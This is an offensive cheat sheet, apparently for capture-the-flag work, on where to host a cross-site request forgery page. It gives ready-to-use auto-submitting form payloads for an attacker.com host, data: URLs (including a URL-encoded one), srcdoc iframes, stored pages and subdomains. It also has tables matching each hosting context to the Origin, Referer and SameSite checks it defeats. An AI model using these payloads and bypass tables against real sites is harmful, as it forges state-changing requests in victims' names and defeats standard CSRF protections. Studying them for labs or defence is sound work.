# Delivery contexts — where the CSRF page can live

The page that fires the write must be reachable to the viewer. Each
hosting context's constraints.

---

## 1. Your external host — the default

```html
<!-- hosted on https://attacker.com/page — the bot/victim fetches it -->
<form action="https://target/x" method=POST><input name=a value=1></form>
<script>document.forms[0].submit()</script>
```

Needs the viewer to reach your host — a bot with internet egress, a
victim who clicks your link. The standard case.

## 2. The data: URL — the self-contained page

```
data:text/html,<form action="https://t/x" method=POST><input name=a value=1></form><script>document.forms[0].submit()</script>
```

The page IS the URL — no external host needed. Submitted to a bot
that accepts a URL. URL-encode when the submit validates:

```
data:text/html,%3Cform%20action%3D%22https%3A%2F%2Ft%2Fx%22%20method%3DPOST%3E%3Cinput%20name%3Da%20value%3D1%3E%3C%2Fform%3E%3Cscript%3Edocument.forms%5B0%5D.submit()%3C%2Fscript%3E
```

The `data:` page's requests send `Origin: null` + no Referer — the
absent-origin bypass. The SSOS card's shape.

## 3. The stored page — on the target itself

```text
a profile/bio/comment/uploaded-HTML that renders on the target —
the CSRF page lives SAME-ORIGIN. bypasses every cross-site gate.
needs a stored-content context (a stored-XSS adjacency).
```

## 4. The blob/srcdoc — a generated page

```html
<iframe srcdoc='<form action="https://t/x" method=POST>
<input name=a value=1></form>
<script>document.forms[0].submit()<\/script>'></iframe>
```

A `srcdoc` iframe is same-origin to its parent — a nested CSRF in
a context that allows iframes.

## 5. The subdomain — a same-site sibling

```html
<!-- hosted on sub.target.com — same-site, attaches Lax cookies -->
<form action="https://target.com/x" method=POST><input name=a value=1></form>
```

Needs a subdomain you control — a takeover, a shared-hosting
subdomain, a sibling app.

## 6. The file: page — a local context

```text
a page opened as file:// — an opaque origin — Origin: null, no
Referer. for a local-viewer CSRF (a file the victim opens). rare.
```

## 7. The javascript:/about: — pseudo-scheme contexts

```html
<a href="javascript:document.forms[0].submit()">x</a>
```

An opaque-origin context — Origin: null. Needs a click or an iframe.

## 8. The context→capabilities matrix

| Context | Origin | Referer | Cookie | Reaches |
|---|---|---|---|---|
| external https | attacker.com | attacker.com | per SameSite | https targets |
| external http | attacker.com | attacker.com | per SameSite | http+loopback |
| data: | null | none | per SameSite | any (PNA-safe nav) |
| stored on target | target.com | target.com | same-origin | same-origin |
| subdomain | sub.target.com | sub.target.com | same-site | same-site |
| file: | null | none | varies | local+net |
| javascript: | null | varies | — | — |

## 9. The context→gate-bypass table

| The gate | The context that bypasses |
|---|---|
| Origin exact-match | a stored/subdomain page (same-site origin) |
| absent-Origin-allow | a data:/file: page (Origin: null) |
| Referer required | a real Referer context (external/stored) |
| no-Referer-allowed | a data:/no-referrer page |
| SameSite=Lax | a subdomain (same-site) or a stored page |
| PNA loopback | a form nav from any context |
| mixed-content | an http or data: page for an http target |

## 10. The airgapped case — the bot can't reach you

```text
the bot is inside the challenge's network — reaches loopback and
internal names but NOT your external host. the CSRF page must be:
- a data: URL (the page IS the submitted string)
- a stored page on the target
- hosted on an internal name the bot resolves
the SSOS card used a data: URL for exactly this reason.
```

## 11. The falsifier

```text
no reachable hosting context AND no stored/subdomain vector AND
the bot won't accept a data: URL — the CSRF page can't reach the
viewer. the delivery channel itself is closed.
```
